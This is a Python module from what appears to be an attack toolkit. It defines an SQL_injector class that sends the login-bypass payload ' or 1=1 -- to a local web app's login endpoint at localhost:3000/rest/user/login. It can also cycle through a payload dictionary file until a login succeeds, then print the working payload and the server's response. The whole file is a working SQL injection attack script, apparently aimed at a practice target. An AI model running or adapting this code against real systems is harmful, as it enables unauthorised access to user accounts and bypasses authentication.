from . import attack as a
from .header_config import *

class SQL_injector(a.attack_inter):
    def __init__(self, dictionary=None):
        self.dictionary = dictionary


    def generator(self, myScript='\' or 1=1 --'):
        cookies = COOKIE

        headers = HEADER

        json_data = {
            'email': myScript,
            'password': '123',
        }

        return cookies, headers, json_data

    def run(self):
        if self.dictionary:
            f = open(self.dictionary, "r")
            for line in f:
                line = line.rstrip()
                cookies, headers, json_data = self.generator(line)
                response = a.requests.post('http://localhost:3000/rest/user/login', cookies=cookies, headers=headers, json=json_data, verify=False)
                if response.status_code == 200:
                    res_payload_dict = response.json()
                    print("Valid script: ", json_data['email'])
                    print(res_payload_dict)
                    break
        else:
            cookies, headers, json_data = self.generator()
            response = a.requests.post('http://localhost:3000/rest/user/login', cookies=cookies, headers=headers, json=json_data, verify=False)
            if response.status_code == 200:
                res_payload_dict = response.json()
                print("Valid script: ", json_data['email'])
                print(res_payload_dict)
            
